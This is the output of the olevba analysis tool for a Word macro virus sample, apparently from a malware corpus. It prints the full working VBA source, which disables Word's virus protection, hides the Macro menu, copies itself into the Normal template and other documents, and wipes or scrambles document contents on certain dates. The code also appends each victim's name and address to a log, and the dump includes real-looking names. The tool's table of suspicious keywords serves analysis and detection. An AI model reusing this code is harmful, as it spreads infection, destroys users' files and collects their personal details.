olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-b7065fba19f1f1c2b48860e417cbd76fb18df42a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-b7065fba19f1f1c2b48860e417cbd76fb18df42a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub autoOpen()
  If DateDiff("s", CDate(GetSetting("3BEPb", "Startup", "date", 0)), Time) > 300 Then
    ActiveDocument.Shapes("3BEPb").Activate
    Selection.HomeKey Unit:=wdStory
    CommandBars("Tools").Controls("Macro").Visible = False
    Options.SaveNormalPrompt = False
  End If
End Sub
Private Sub Document_Close()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
            NT.codemodule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)

            AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
            AD.codemodule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
            NT.codemodule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)

            AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
            AD.codemodule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub
' 02:01:14 PM - Sunday, 16 May 1999
' USER5
'



' 10:14:21 AM - Monday, 17 May 1999
' Neelam Darne
'



' 09:22:49 PM - Saturday, 5 Jun 1999
' Mitesh Sanghani
'



' 11:40:33 AM - Friday, 11 Jun 1999
' Mitesh Sanghani
'



' 01:58:41 PM - Friday, 11 Jun 1999
' Administrator
'



' 02:47:52 PM - Monday, 16 Jun 1997
' Rajiv lal
'



' 12:42:01 PM - Friday, 2 Jul 1999
' RAJIV LAL
'



' 11:27:06 AM - Monday, 19 Jul 1999
' PGD98059
'



' 07:07:12 PM - Monday, 23 Aug 1999
' ss
'



' 06:56:23 PM - Friday, 27 Aug 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:35:52 PM - Friday, 10 Sep 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:58:59 AM - Wednesday, 20 Oct 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 09:16:48  - torsdag, 26 nov 2099
' sai
'



' 09:56:32 AM - Wednesday, 5 Jan 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 09:17:55 AM - Friday, 7 Jan 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:59:51 AM - Friday, 4 Feb 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:37:08 AM - Monday, 8 May 2000
' raja
'



' 09:40:53 PM - Monday, 29 May 2000
' raja
'



' 01:37:26 AM - Wednesday, 1 Jan 1997
' Mr.Ramessh
'



' 10:09:03 AM - Wednesday, 13 Sep 2000
' advansoft
'



' 06:44:02 AM - Friday, 8 Dec 2000
' Dirty PC
' CNNHS B'92 PHILIPPINES (CNSC)



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

